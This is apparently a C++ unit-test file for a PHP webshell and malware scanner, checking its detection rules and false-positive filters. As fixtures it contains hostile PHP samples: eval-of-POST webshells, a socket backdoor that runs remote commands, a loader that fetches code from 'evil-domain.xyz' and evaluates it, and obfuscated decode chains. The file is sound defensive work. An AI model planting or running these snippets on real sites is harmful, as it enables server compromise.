#include <gtest/gtest.h>
#include "rules/Registry.hpp"
#include <re2/re2.h>
#include "config/Types.h"
#include "core/MatchEngine.h"
#include "core/LiteralPrefilter.h"
#include "utils/SafeText.h"

using namespace lyxbosa::rules;
using namespace lyxbosa;

// ============================================================================
// RuleCode Tests
// ============================================================================

TEST(RuleCodeTest, ParseValidCode) {
    auto code = RuleCode::parse("WS001");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::Webshell);
    EXPECT_EQ(code->number, 1);
}

TEST(RuleCodeTest, ParseCodeWithLargerNumber) {
    auto code = RuleCode::parse("RCE123");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::CodeExec);
    EXPECT_EQ(code->number, 123);
}

TEST(RuleCodeTest, ParseInvalidCode) {
    EXPECT_FALSE(RuleCode::parse("INVALID001").has_value());
    EXPECT_FALSE(RuleCode::parse("WS").has_value());
    EXPECT_FALSE(RuleCode::parse("123").has_value());
    EXPECT_FALSE(RuleCode::parse("").has_value());
}

TEST(RuleCodeTest, ToString) {
    RuleCode code{Category::Webshell, 1};
    EXPECT_EQ(code.toString(), "WS001");

    RuleCode code2{Category::CodeExec, 99};
    EXPECT_EQ(code2.toString(), "RCE099");
}

// ============================================================================
// Category Tests
// ============================================================================

TEST(CategoryTest, ParseCategory) {
    EXPECT_EQ(parseCategory("WS"), Category::Webshell);
    EXPECT_EQ(parseCategory("RCE"), Category::CodeExec);
    EXPECT_EQ(parseCategory("OBF"), Category::Obfuscation);
    EXPECT_FALSE(parseCategory("INVALID").has_value());
}

TEST(CategoryTest, CategoryInfo) {
    const auto& info = getCategoryInfo(Category::Webshell);
    EXPECT_EQ(info.code, "WS");
    EXPECT_EQ(info.name, "Webshell");
}

// ============================================================================
// Registry Tests
// ============================================================================

TEST(RegistryTest, GetRuleByCode) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);
    EXPECT_EQ(rule->name, "China Chopper webshell");
    EXPECT_EQ(rule->severity, Severity::Critical);
}

TEST(RegistryTest, GetRuleByInvalidCode) {
    auto* rule = getRuleByCode("INVALID999");
    EXPECT_EQ(rule, nullptr);
}

TEST(RegistryTest, GetRulesByCategory) {
    auto rules = getRulesByCategory(Category::Webshell);
    EXPECT_GT(rules.size(), 0);

    for (const auto* rule : rules) {
        EXPECT_EQ(rule->code.category, Category::Webshell);
    }
}

TEST(RegistryTest, GetAllRules) {
    const auto& allRules = getAllBuiltinRules();
    EXPECT_GT(allRules.size(), 0);
}

// ============================================================================
// Pattern Matching Tests - China Chopper (WS001)
// ============================================================================

TEST(WebshellTest, ChinaChopperMatches) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);

    // China Chopper patterns - direct eval/assert of POST data
    const char* sample1 = R"(<?php @eval($_POST['pass']);?>)";
    const char* sample2 = R"(<?php @eval ( $_POST [ 'x' ] ); ?>)";
    const char* sample3 = R"(<?php assert($_POST['cmd']);?>)";

    EXPECT_TRUE(rule->matches(sample1));
    EXPECT_TRUE(rule->matches(sample2));
    EXPECT_TRUE(rule->matches(sample3));

    auto results = rule->findMatches(sample1);
    EXPECT_GT(results.size(), 0);
}

TEST(WebshellTest, ChinaChopperZ0Param) {
    // WS002 is the z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("$_POST['z0']"));
    EXPECT_TRUE(rule->matches("$_REQUEST['z0']"));
}

TEST(WebshellTest, ChinaChopperNoFalsePositive) {
    // WS002 tests z0 param - normal params should NOT match
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    // Normal POST access should NOT match
    EXPECT_FALSE(rule->matches("$_POST['username']"));
    EXPECT_FALSE(rule->matches("$_POST['password']"));
}

// ============================================================================
// Pattern Matching Tests - Simple Backdoor patterns
// ============================================================================

TEST(WebshellTest, WSOWebshellMatches) {
    auto* rule = getRuleByCode("WS004");  // WSO webshell
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("WSO 2.0"));
    EXPECT_TRUE(rule->matches("Web Shell by oRb"));
}

// ============================================================================
// Pattern Matching Tests - Code Execution (RCE)
// ============================================================================

TEST(CodeExecTest, EvalBase64Matches) {
    auto* rule = getRuleByCode("RCE001");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(base64_decode($x));"));
    EXPECT_TRUE(rule->matches("eval( base64_decode( $data ) );"));
}

TEST(CodeExecTest, EvalGzinflateMatches) {
    auto* rule = getRuleByCode("RCE002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(gzinflate(base64_decode($x)));"));
    EXPECT_TRUE(rule->matches("eval( gzinflate( $data ));"));
}

TEST(CodeExecTest, DynamicEvalMatches) {
    // RCE003 is dynamic function with user input - $var($_GET[...])
    // Pattern requires statement boundary (newline, semicolon, etc.) before $var
    // This excludes method calls like $this->$method($_GET[...])
    auto* rule = getRuleByCode("RCE003");
    ASSERT_NE(rule, nullptr);

    // Realistic test cases with statement context
    EXPECT_TRUE(rule->matches("<?php\n$func($_POST['code']);"));
    EXPECT_TRUE(rule->matches("some_call(); $handler($_GET['x']);"));

    // Should NOT match method calls
    EXPECT_FALSE(rule->matches("$this->$method($_GET['ID']);"));
}

TEST(CodeExecTest, ShellExecMatches) {
    // RCE008 is shell_exec/system/passthru with user input
    auto* rule = getRuleByCode("RCE008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("shell_exec($_GET['cmd']);"));
    EXPECT_TRUE(rule->matches("passthru($_POST['c']);"));
    EXPECT_TRUE(rule->matches("system($_REQUEST['x']);"));
}

// ============================================================================
// False Positive Tests - Legitimate Code Should NOT Match
// ============================================================================

TEST(FalsePositiveTest, LegitimateUploadHandler) {
    // WS008 is malicious upload handler - user-controlled destination
    auto* rule = getRuleByCode("WS008");
    ASSERT_NE(rule, nullptr);

    // This is legitimate - destination is NOT from user input
    const char* legitimate = R"(
        move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $filename);
    )";

    EXPECT_FALSE(rule->matches(legitimate));
}

TEST(FalsePositiveTest, LegitimateEval) {
    auto* rule = getRuleByCode("RCE003");  // Dynamic eval
    ASSERT_NE(rule, nullptr);

    // eval with hardcoded string - NOT user input
    const char* legitimate = "eval('return 1 + 1;');";

    EXPECT_FALSE(rule->matches(legitimate));
}

// ============================================================================
// Match Position Tests
// ============================================================================

TEST(MatchPositionTest, SingleLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php $_POST['z0']; ?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 1);
    EXPECT_GT(results[0].column, 0);
}

TEST(MatchPositionTest, MultiLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php\n// comment\n$_POST['z0'];\n?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 3);  // Should be on line 3
}

// ============================================================================
// Dropper Rule Tests (DRP)
// ============================================================================

TEST(DropperTest, DRP007_LargeBase64Staging) {
    auto* rule = getRuleByCode("DRP007");
    ASSERT_NE(rule, nullptr);

    // Generate a string with 600+ base64 characters
    std::string base64_chars;
    for (int i = 0; i < 600; i++) base64_chars += "A";

    std::string malicious = "$data = base64_decode(\"" + base64_chars + "\");";
    EXPECT_TRUE(rule->matches(malicious)) << "DRP007 should match large base64 in variable";

    // Should NOT match small base64 strings
    EXPECT_FALSE(rule->matches("$x = base64_decode(\"SGVsbG8=\");"));

    // Test findMatches (used by scanner)
    auto results = rule->findMatches(malicious);
    EXPECT_GT(results.size(), 0) << "DRP007 findMatches should return results";
}

TEST(DropperTest, DRP008_ArchiveDropper) {
    auto* rule = getRuleByCode("DRP008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("file_put_contents(\"malware.zip\", $data);"));
    EXPECT_TRUE(rule->matches("file_put_contents('backdoor.tar.gz', $content);"));
    EXPECT_FALSE(rule->matches("file_put_contents(\"config.php\", $data);"));
}

// ============================================================================
// Backdoor Tests
// ============================================================================

TEST(BackdoorTest, BD016_Base64IncludeBackdoor) {
    auto* rule = getRuleByCode("BD016");
    ASSERT_NE(rule, nullptr);

    // Real-world WordPress template injection (exact pattern from the wild)
    EXPECT_TRUE(rule->matches(
        R"(<?php @include base64_decode("L3Zhci93d3cvdmhvc3RzL3dpem5ldC5nci9jdWx0cmFkaW8uZ3I=");?>)"));

    // With parentheses around include argument
    EXPECT_TRUE(rule->matches(
        R"(<?php @include(base64_decode("L3Zhci93d3cv"));?>)"));

    // include_once variant
    EXPECT_TRUE(rule->matches(
        R"(@include_once base64_decode("L3Zhci93d3cv");)"));

    // require variant
    EXPECT_TRUE(rule->matches(
        R"(@require base64_decode("L3Zhci93d3cv");)"));

    // require_once variant
    EXPECT_TRUE(rule->matches(
        R"(@require_once(base64_decode("L3Zhci93d3cv"));)"));

    // Without @ suppressor (still malicious)
    EXPECT_TRUE(rule->matches(
        R"(include base64_decode("L3Zhci93d3cv");)"));

    // With spaces between @ and include
    EXPECT_TRUE(rule->matches(
        R"(@ include base64_decode("L3Zhci93d3cv");)"));

    // False positives: legitimate base64_decode usage (not with include/require)
    EXPECT_FALSE(rule->matches(
        R"($data = base64_decode("SGVsbG8gV29ybGQ=");)"));
    EXPECT_FALSE(rule->matches(
        R"(echo base64_decode($encoded);)"));
    EXPECT_FALSE(rule->matches(
        R"(file_put_contents($path, base64_decode($data));)"));
}

TEST(BackdoorTest, BD017_HtaccessBackdoorWhitelist) {
    auto* rule = getRuleByCode("BD017");
    ASSERT_NE(rule, nullptr);

    // Real-world malicious .htaccess: deny all PHP, whitelist backdoor scripts
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \".(py|exe|php)$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"
        "<FilesMatch \"^(lock360.php|wp-l0gin.php|wp-the1me.php|wp-scr1pts.php|radio.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known backdoor name in FilesMatch (leet-speak)
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(wp-l0gin.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known shell name in FilesMatch
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(c99.php|r57.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // False positive: legitimate FilesMatch for security (blocking PHP uploads)
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.php$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"));

    // False positive: normal FilesMatch for caching
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.(css|js|png|jpg)$\">\n"
        "Header set Cache-Control \"max-age=604800\"\n"
        "</FilesMatch>\n"));
}

// ============================================================================
// Context Filter Tests - False Positive Reduction
// These test the MatchEngine's context-aware filtering via full match() calls
// ============================================================================

class ContextFilterTest : public ::testing::Test {
protected:
    lyxbosa::MatchEngine engine;

    void SetUp() override {
        engine.loadAllBuiltinRules();
    }

    // Helper: check if a specific rule code produced matches
    bool hasMatchForRule(const std::vector<lyxbosa::FileMatch>& matches, const std::string& ruleCode) {
        for (const auto& m : matches) {
            if (m.category == ruleCode) return true;
        }
        return false;
    }
};

// BD005: Should skip Monolog CubeHandler (vendor-prefixed path)
TEST_F(ContextFilterTest, BD005_SkipsMonologCubeHandler) {
    // Simulated Monolog CubeHandler content with socket_create + exec elsewhere
    const char* content =
        "<?php\n"
        "namespace Monolog\\Handler;\n"
        "class CubeHandler extends AbstractHandler {\n"
        "    private function connectUdp(): void {\n"
        "        $udpConnection = socket_create(AF_INET, SOCK_DGRAM, 0);\n"
        "        if (false === $udpConnection) {\n"
        "            throw new \\RuntimeException('Could not create socket');\n"
        "        }\n"
        "    }\n"
        "    protected function exec($cmd) { return $cmd; }\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/the-events-calendar/common/vendor-prefixed/monolog/monolog/src/Monolog/Handler/CubeHandler.php");
    EXPECT_FALSE(hasMatchForRule(matches, "BD005"))
        << "BD005 should be filtered out for Monolog CubeHandler";
}

// BD005: Should still detect real socket backdoors
TEST_F(ContextFilterTest, BD005_DetectsRealSocketBackdoor) {
    const char* content =
        "<?php\n"
        "$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n"
        "socket_connect($sock, $_GET['ip'], $_GET['port']);\n"
        "while($cmd = socket_read($sock, 2048)) {\n"
        "    $out = shell_exec($cmd);\n"
        "    socket_write($sock, $out);\n"
        "}\n";

    auto matches = engine.match(content, "wp-content/uploads/backdoor.php");
    EXPECT_TRUE(hasMatchForRule(matches, "BD005"))
        << "BD005 should detect real socket backdoor";
}

// OBF011: Should skip WPBakery rawurldecode(base64_decode(...))
TEST_F(ContextFilterTest, OBF011_SkipsWPBakeryJsComposer) {
    const char* content =
        "<?php\n"
        "function vc_value_from_safe($value) {\n"
        "    return rawurldecode(base64_decode(strip_tags($value)));\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/js_composer/include/helpers/helpers_factory.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out for WPBakery js_composer";
}

// OBF011: Should skip when htmlentities context (display code)
TEST_F(ContextFilterTest, OBF011_SkipsHtmlentitiesContext) {
    const char* content =
        "<?php\n"
        "$output = htmlentities(rawurldecode(base64_decode($value)), ENT_COMPAT, 'UTF-8');\n";

    auto matches = engine.match(content,
        "wp-content/themes/mytheme/functions.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out when htmlentities is on the same line";
}

// OBF011: Should still detect suspicious rawurldecode+base64 outside builders
TEST_F(ContextFilterTest, OBF011_DetectsSuspiciousUsage) {
    const char* content =
        "<?php\n"
        "$payload = rawurldecode(base64_decode($_POST['data']));\n"
        "eval($payload);\n";

    auto matches = engine.match(content, "wp-content/uploads/cache.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should detect suspicious rawurldecode+base64 in unknown files";
}

// OBF010: Should skip RevSlider compressed data import
TEST_F(ContextFilterTest, OBF010_SkipsRevSliderDataImport) {
    const char* content =
        "<?php\n"
        "function import_slider_data($data) {\n"
        "    $data = gzuncompress(base64_decode($data));\n"
        "    $_data = json_decode($data, true);\n"
        "    return (!empty($_data)) ? $_data : false;\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/functions.class.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should be filtered out for RevSlider data import";
}

// OBF010: Should still detect malicious gzuncompress+base64
TEST_F(ContextFilterTest, OBF010_DetectsMaliciousUsage) {
    const char* content =
        "<?php\n"
        "$code = gzuncompress(base64_decode($encoded));\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/tmp.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should detect malicious gzuncompress+base64 in unknown paths";
}

// DRP001: Should skip googleapis.com URL
TEST_F(ContextFilterTest, DRP001_SkipsGoogleApisUrl) {
    const char* content =
        "<?php\n"
        "$list_raw = file_get_contents('https://www.googleapis.com/webfonts/v1/webfonts?sort=popularity');\n"
        "// ... many lines of code ...\n"
        "function some_other_function() {\n"
        "    eval($template);\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/googlefonts.php");
    EXPECT_FALSE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should be filtered out for googleapis.com URL";
}

// DRP001: Should still detect real remote code loaders
TEST_F(ContextFilterTest, DRP001_DetectsRealRemoteLoader) {
    const char* content =
        "<?php\n"
        "$code = file_get_contents('https://evil-domain.xyz/payload.txt');\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/loader.php");
    EXPECT_TRUE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should detect real remote code loaders";
}

// ============================================================================
// Runtime string assembly (OBF024 / OBF025)
// The scanner folds string expressions, so detection does not depend on how
// the attacker chose to cut up the identifier.
// ============================================================================

class StringAssemblyTest : public ::testing::Test {
protected:
    // Returns the analyzer's notes for a rule, so tests can assert on what it resolved
    std::vector<std::string> notesFor(const char* content, const char* ruleCode) {
        const auto* rule = getRuleByCode(ruleCode);
        EXPECT_NE(rule, nullptr);

        std::vector<std::string> notes;
        if (!rule) return notes;

        for (const auto& match : rule->findMatches(content)) {
            notes.push_back(match.note);
        }
        return notes;
    }

    bool anyNoteContains(const std::vector<std::string>& notes, std::string_view needle) {
        for (const auto& note : notes) {
            if (note.find(needle) != std::string::npos) return true;
        }
        return false;
    }
};

// The injector that motivated this rule: fragments in separate variables,
// concatenated with more inline fragments, then called and eval'd.
TEST_F(StringAssemblyTest, DetectsFragmentedBase64DecodeLoader) {
    const char* content =
        "<?php ini_set(\"memory_limit\",\"-1\");\n"
        "$f=\"ba\"; $h=\"s\"; $l=\"e\"; $n=\"64\";\n"
        "$o=$f.$h.$l.$n.\"_d\".$l.\"cod\".$l;\n"
        "$p=\"Z290byBsQ1lHbw==\";\n"
        "eval($o($p));\n"
        "require __DIR__ . '/wp-blog-header.php';\n";

    auto notes = notesFor(content, "OBF024");
    ASSERT_FALSE(notes.empty());
    EXPECT_TRUE(anyNoteContains(notes, "\"base64_decode\""));
}

// Same technique, every other shape it comes in
TEST_F(StringAssemblyTest, DetectsAssemblyRegardlessOfTechnique) {
    struct Case {
        const char* content;
        const char* resolves;
    };

    const Case cases[] = {
        {"<?php $a=\"ev\"; $b=\"al\"; $c=$a.$b; $c($x);", "\"eval\""},
        {"<?php $s=\"as\"; $s .= \"sert\"; @$s($payload);", "\"assert\""},
        {"<?php $r = strrev(\"edoced_46esab\");", "\"base64_decode\""},
        {"<?php $i = implode(\"\", array(\"sy\",\"st\",\"em\"));", "\"system\""},
        {"<?php $t = str_replace(\"Q\",\"\",\"sQysQtQem\");", "\"system\""},
        {"<?php $h = chr(101).chr(118).chr(97).chr(108);", "\"eval\""},
        {"<?php $b = base64_decode(\"c2hlbGxfZXhlYw==\");", "\"shell_exec\""},
        {"<?php $p = pack(\"H*\", \"6576616c\");", "\"eval\""},
        {"<?php $v = \"_PO\".\"S\".\"T\"; $d = $$v;", "\"_POST\""},
    };

    for (const auto& testCase : cases) {
        auto notes = notesFor(testCase.content, "OBF024");
        EXPECT_TRUE(anyNoteContains(notes, testCase.resolves))
            << "Failed to resolve " << testCase.resolves << " in: " << testCase.content;
    }
}

// An assembled name that is not on the sensitive list still counts when the
// result is what gets called - that is what keeps the rule generic.
TEST_F(StringAssemblyTest, DetectsUnknownNameThatIsCalledDynamically) {
    const char* content =
        "<?php\n"
        "$g = \"my\".\"_Sec\".\"ret\".\"Fn\";\n"
        "$g($argument);\n";

    auto notes = notesFor(content, "OBF024");
    EXPECT_TRUE(anyNoteContains(notes, "\"my_SecretFn\""));
}

// A `.=` chain reports the finished name once, not every intermediate state
TEST_F(StringAssemblyTest, CollapsesAppendChainIntoOneFinding) {
    const char* content =
        "<?php\n"
        "$g='';$g.=\"b\";$g.=\"a\";$g.=\"se\";$g.=\"64\";$g.=\"_de\";$g.=\"code\";\n"
        "$g($data);\n";

    auto notes = notesFor(content, "OBF024");
    ASSERT_EQ(notes.size(), 1u);
    EXPECT_NE(notes[0].find("\"base64_decode\""), std::string::npos);
}

// A sensitive name split across exactly two literals is the weak signal:
// reported, but as OBF025 (medium) rather than OBF024 (critical)
TEST_F(StringAssemblyTest, PlainTwoLiteralSplitIsReportedSeparately) {
    const char* content =
        "<?php\n"
        "$fn = 'base64' . '_decode';\n"
        "return $fn($input);\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_FALSE(notesFor(content, "OBF025").empty());
}

// Ordinary concatenation must stay silent
TEST_F(StringAssemblyTest, NoFalsePositiveOnLegitimateConcatenation) {
    const char* content =
        "<?php\n"
        "class OrderExporter {\n"
        "    const PREFIX = 'order_';\n"
        "    public function build($row) {\n"
        "        $key = self::PREFIX . 'export';\n"
        "        $table = $this->db->prefix . 'orders';\n"
        "        $sql = 'SELECT id FROM ' . $table . ' WHERE status = 1';\n"
        "        $path = __DIR__ . '/../var/cache/' . $key . '.json';\n"
        "        $method = 'get' . ucfirst('total');\n"
        "        return $sql . $path . $method;\n"
        "    }\n"
        "}\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_TRUE(notesFor(content, "OBF025").empty());
}

// Parameter defaults are not assignments, and a folded value must be the whole
// right-hand side - both were false positives against Joomla's factories.
TEST_F(StringAssemblyTest, NoFalsePositiveOnFactoryClassNames) {
    const char* content =
        "<?php\n"
        "class BaseController {\n"
        "    public function getView($name = '', $type = '', $prefix = '') {\n"
        "        $class = ucfirst($prefix) . 'Controller' . ucfirst($type);\n"
        "        if (class_exists($class)) {\n"
        "            return new $class();\n"
        "        }\n"
        "    }\n"
        "    public function getLanguage($lang = '') {\n"
        "        $lang = $lang ?: $this->getDefaultLanguage();\n"
        "        $class = str_replace('-', '_', $lang . 'Localise');\n"
        "        return new $class();\n"
        "    }\n"
        "}\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
    EXPECT_TRUE(notesFor(content, "OBF025").empty());
}

// Interpolated strings are not the literal text they are written as
TEST_F(StringAssemblyTest, IgnoresInterpolatedStrings) {
    const char* content =
        "<?php\n"
        "$a = \"ev\"; $b = \"al\";\n"
        "$c = \"$a\" . \"{$b}\";\n";

    EXPECT_TRUE(notesFor(content, "OBF024").empty());
}

// ============================================================================
// OBF036 - Binary payload inside a file that declares itself as text
// ============================================================================

class BinaryInTextTest : public ::testing::Test {
protected:
    // The analyzer sees content only; the extension gate lives in MatchEngine.
    bool fires(std::string_view content) {
        const auto* rule = getRuleByCode("OBF036");
        EXPECT_NE(rule, nullptr);
        if (!rule) return false;
        return !rule->findMatches(content).empty();
    }

    // A .php that carries an encrypted stage ahead of its source, as seen in
    // live-cleanup-batch3-quarantine/55e69bc987921bd7.php - 5,900 bytes, 416 control
    // bytes, 28.4% of them adjacent to another. The byte distribution has to be modelled,
    // not just the control-byte count: an earlier version of this fixture alternated one
    // control byte with one letter, which no real payload does and which the adjacency
    // test in the analyzer correctly rejects.
    std::string blobThenPhp() {
        std::string s;
        // A cheap deterministic PRNG standing in for ciphertext. Every byte value is
        // equally likely, so control bytes land next to each other at the rate a real
        // encrypted or deflated stage does.
        uint32_t state = 0x1d0f461cu;
        for (int i = 0; i < 800; ++i) {
            state = state * 1664525u + 1013904223u;
            s.push_back(static_cast<char>((state >> 16) & 0xFF));
        }
        s += "<?php goto vSHrlRg; $x = 1; ?>";
        return s;
    }

    // Symfony's polyfill-iconv charset tables (`from.us-ascii.php`) list every byte value
    // 0x00-0x1F as an array key, so they clear the 2% control-byte ratio while holding no
    // payload at all. Each control byte is isolated between `=>` and `,`.
    std::string charsetTable() {
        std::string s = "<?php\n\nstatic $data = array (\n";
        for (int i = 0; i < 32; ++i) {
            s += "  \"";
            s.push_back(static_cast<char>(i));
            s += "\" => \"\\u{00";
            s += "0123456789abcdef"[(i >> 4) & 0xF];
            s += "0123456789abcdef"[i & 0xF];
            s += "}\",\n";
        }
        s += ");\n";
        return s;
    }

    bool gatedFor(std::string_view path, std::string_view content) {
        MatchContext ctx;
        ctx.content = content;
        ctx.filePath = path;
        ctx.matchOffset = 0;
        ctx.matchLine = 1;
        ctx.matchColumn = 1;
        ctx.matchedText = content.substr(0, 1);
        return MatchEngine::applyContextFilter("OBF036", ctx);
    }
};

TEST_F(BinaryInTextTest, FlagsBinaryBlobPrependedToSource) {
    EXPECT_TRUE(fires(blobThenPhp()));
}

TEST_F(BinaryInTextTest, IgnoresOrdinarySource) {
    EXPECT_FALSE(fires("<?php\n$a = 1;\nfunction f() { return 2; }\n"));
}

// The whole point of measuring C0 controls rather than "non-ASCII": UTF-8 text in
// any script must score zero. A rule that counted high bytes would flag every
// translation file in the tree.
TEST_F(BinaryInTextTest, IgnoresUtf8InEveryScript) {
    const char* samples[] = {
        "<?php // Καλωσορίσατε στο ξενοδοχείο μας, τιμές και κρατήσεις\n",
        "<?php // 日本語のテキストです。プラグイン設定を変更してください。\n",
        "<?php // 这是一个中文测试文件，用于验证编码处理是否正确。\n",
        "<?php // 한국어 텍스트입니다. 워드프레스 플러그인 설정.\n",
        "<?php // مرحبا بكم في موقعنا. هذا نص تجريبي باللغة العربية.\n",
        "<?php // שלום וברוכים הבאים לאתר שלנו. זהו טקסט לדוגמה.\n",
        "<?php // Это тестовый файл на русском языке для проверки.\n",
        "<?php // นี่คือข้อความภาษาไทยสำหรับทดสอบการเข้ารหัส\n",
        "<?php // यह एक हिंदी परीक्षण फ़ाइल है।\n",
        "<?php // Status: done, progress 100% \xF0\x9F\x8E\x89\xF0\x9F\x94\xA5\xE2\x9A\xA1\n",
        "<?php // \xF0\x9F\x91\xA8\xE2\x80\x8D\xF0\x9F\x91\xA9\xE2\x80\x8D\xF0\x9F\x91\xA7 ZWJ family\n",
        "<?php // \xE2\x94\x8C\xE2\x94\x80\xE2\x94\xAC\xE2\x94\x80\xE2\x94\x90 box drawing\n",
    };
    for (const auto* s : samples) {
        EXPECT_FALSE(fires(s)) << "UTF-8 text must never be read as a binary payload: " << s;
    }
}

// UTF-16 source is half NUL bytes by construction and must be exempted, or every
// UTF-16 file in a tree becomes a critical finding.
TEST_F(BinaryInTextTest, IgnoresUtf16WithBom) {
    std::string utf16le = "\xFF\xFE";
    const char* ascii = "<?php $a = 1; function f() { return 2; }";
    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
    EXPECT_FALSE(fires(utf16le));
}

TEST_F(BinaryInTextTest, IgnoresUtf16WithoutBom) {
    std::string utf16le;
    const char* ascii = "<?php $a = 1; function f() { return 2; } // padding text here";
    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
    EXPECT_FALSE(fires(utf16le));
}

TEST_F(BinaryInTextTest, IgnoresShortFiles) {
    EXPECT_FALSE(fires(std::string("\x01\x02\x03\x04", 4)));
}

// Extension gate: binary in .php is anomalous, binary in .png is the file format.
TEST_F(BinaryInTextTest, GateAcceptsTextExtensions) {
    auto blob = blobThenPhp();
    EXPECT_TRUE(gatedFor("/var/www/html/wp-content/cache/x.php", blob));
    EXPECT_TRUE(gatedFor("/var/www/html/assets/app.js", blob));
    EXPECT_TRUE(gatedFor("/var/www/html/index.HTML", blob));
}

TEST_F(BinaryInTextTest, GateRejectsBinaryFormats) {
    auto blob = blobThenPhp();
    EXPECT_FALSE(gatedFor("/var/www/html/img/logo.png", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/fonts/inter.woff2", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/media/clip.mp4", blob));
    EXPECT_FALSE(gatedFor("/var/www/html/backup.zip", blob));
}

TEST_F(BinaryInTextTest, GateRejectsKnownBinaryBearingText) {
    auto blob = blobThenPhp();
    // Wordfence keeps WAF state as binary inside .php under wflogs/
    EXPECT_FALSE(gatedFor("/var/www/wp-content/wflogs/attack-data.php", blob));
    // SQL dumps legitimately carry BLOB literals
    EXPECT_FALSE(gatedFor("/var/www/backup/dump.sql", blob));
}

// A byte table clears the density threshold but has no adjacent control bytes at all.
// Measured on a production host: the iconv tables and nvm's captured terminal output score
// exactly 0 adjacent pairs, while all 50 real payloads score >= 5 and >= 9.8%.
TEST_F(BinaryInTextTest, IgnoresCharsetTableWhereControlBytesAreIsolated) {
    EXPECT_FALSE(fires(charsetTable()));
}

// AppleDouble stubs: unpacking a Mac-authored theme zip leaves a `._name.php` beside every
// `name.php`. It carries the .php suffix but is resource-fork metadata, not PHP.
TEST_F(BinaryInTextTest, GateRejectsAppleDoubleStub) {
    std::string stub("\x00\x05\x16\x07\x00\x02\x00\x00", 8);
    stub += "Mac OS X        ";
    stub += blobThenPhp();
    EXPECT_TRUE(fires(stub)) << "the analyzer still measures it; the gate is what rejects it";
    EXPECT_FALSE(gatedFor("/var/www/wp-content/themes/__MACOSX/x/._content.php", stub));
    // The magic, not the path, is the test - a stub unpacked elsewhere is still a stub.
    EXPECT_FALSE(gatedFor("/var/www/wp-content/themes/x/._content.php", stub));
}

// `protoc --php_out` stores a serialised FileDescriptorProto in a single-quoted PHP string,
// so a generated GPBMetadata class is legitimately half control bytes. This was 900 of the
// 1,018 OBF036 false positives on one host.
TEST_F(BinaryInTextTest, GateRejectsGeneratedProtobufMetadata) {
    std::string header =
        "<?php\n# Generated by the protocol buffer compiler.  DO NOT EDIT!\n"
        "# source: google/protobuf/struct.proto\n\nnamespace GPBMetadata\\Google\\Protobuf;\n";
    std::string gen = header + blobThenPhp();
    EXPECT_FALSE(gatedFor("/var/www/plugins/x/vendor/google/protobuf/metadata/Struct.php", gen));
    // Site Kit and Forminator prefix dependencies into third-party/, not vendor/, so the
    // test has to read the file's declaration rather than its path.
    EXPECT_FALSE(gatedFor("/var/www/plugins/x/third-party/google/metadata/Struct.php", gen));

    // The namespace alone is enough - some generators emit it without the header comment.
    std::string nsOnly = "<?php\n\nnamespace GPBMetadata\\Google\\Ads;\n" + blobThenPhp();
    EXPECT_FALSE(gatedFor("/var/www/plugins/x/metadata/Ads.php", nsOnly));

    // ...and a real payload in a path that merely says "metadata" is still a finding.
